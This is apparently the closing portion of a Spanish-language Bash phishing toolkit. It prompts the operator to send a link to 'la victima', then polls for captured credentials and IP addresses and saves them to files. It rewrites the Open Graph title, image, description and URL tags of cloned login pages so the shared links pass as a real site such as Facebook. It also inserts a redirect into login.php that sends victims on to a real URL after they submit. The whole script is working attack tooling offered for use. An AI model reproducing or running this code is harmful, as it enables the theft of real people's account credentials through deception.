echo -e "\n\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m No escribiste la URL :b"
sleep 3
tags
else
tag6=6
photo_link
fi

elif [[ $addopc == "7" || $addopc == "07" ]];then
read -p $'\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m Escribe el nombre de la web(example:Facebook)\e[1;39m> ' site_name

if [[ $site_name == "" ]];then
echo -e "\n\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m No escribiste el nombre :b"
sleep 3
tags
else
tag7=7
show_telegram
tags
fi

elif [[ $addopc == "run" || $addopc == "Run" || $addopc == "RUN" ]];then
clear
banner
echo -e "\n$r[$g*$r]$c Web:$g $server"
menu_add
if [[ $run == "predator" ]]; then
localrunx
else
printf "\n\e[1;91m[\e[1;96m*\e[1;91m]\e[1;96m Envia este link a la victima:\e[0m\e[1;77m %s\e[0m\n" $send_link
checkfound
fi
fi
}


#datos
checkfound() {
printf "\n"
printf "\e[1;91m[\e[0m\e[1;36m*\e[0m\e[1;91m]\e[1;96m Esperando credenciales, Presiona Ctrl + C para salir...\e[0m\n"
while [ true ]; do
if [[ -e "sites/$server/ips.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Funcionando!\n"
ip_s
rm -rf sites/$server/ips.txt
fi
if [[ -e "ips.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Funcionando!\n"
ip_s2
rm -rf ips.txt
fi
sleep 0.5
if [[ -e "sites/$server/users.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciales Funcionando!\n"
catch_cred
cat sites/$server/users.txt >> sites/$server/usernames.txt
rm -rf sites/$server/users.txt
fi
if [[ -e "users.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciales Funcionando!\n"
catch_cred2
cat users.txt >> usernames.txt
rm -rf users.txt
fi
sleep 0.5
done
}


#tags
show_title(){
ogtitle="<meta property='og:title' content='$title'/>"
cd sites/$server &> /dev/null
sed -i "/<meta property='og:title' content='.*'/d" ./index.html
sed -i '4i '"$ogtitle"'' index.html
}

show_photo(){
if [[ -d sites/$server/images ]];then
rm -rf sites/$server/images
fi

cd sites/$server &> /dev/null
mkdir images
cp "$ruta" images
obtener_name=$(basename "$ruta")
total="$send_link/images/$obtener_name"
ogimg="<meta property='og:image' content='$total'/>"
sed -i "/<meta property='og:image' content='.*'/d" ./index.html
sed -i '4i '"$ogimg"'' index.html
}

photo_link(){
cd sites/$server &> /dev/null
ogimg2="<meta property='og:image' content='$link2' />"
sed -i "/<meta property='og:image' content='.*'/d" ./index.html
sed -i '4i '"$ogimg2"'' index.html
tags
}


show_text(){
ogtext="<meta property='og:description' content='$text' />"
cd sites/$server &> /dev/null
sed -i "/<meta property='og:description' content='.*'/d" ./index.html
sed -i '4i '"$ogtext"'' index.html
}

show_url(){
ogurl="<meta property='og:url' content='http://$url2' />"
cd sites/$server &> /dev/null
sed -i "/<meta property='og:url' content='.*'/d" ./index.html
sed -i '4i '"$ogurl"'' index.html
}

show_telegram(){
ogtel="<meta property='og:site_name' content='$site_name' />"
cd sites/$server &> /dev/null
sed -i "/<meta property='og:url' content='.*'/d" ./index.html
sed -i '4i '"$ogtel"'' index.html
}

fake(){
read -p $'\e[1;31m[\e[1;32m*\e[1;31m]\e[1;36m Escribe la URL a redireccionar(Usa: http/https)\e[1;39m > ' link3
if [[ $link3 == "" ]];then
echo -e "\n$r[$g!$r]$c No escribiste la URL"
sleep 3
tags
else
tag5=5
comi='"'
meta="$comi<meta http-equiv='refresh' content='1;url=$link3'>  $comi;"
web="echo $meta"
cd sites/$server &> /dev/null
sed -i '11d' login.php
sed -i '11i '"$web"'' login.php
tags
fi
}




depen
bash depen/progress.sh
banner
menu
stop
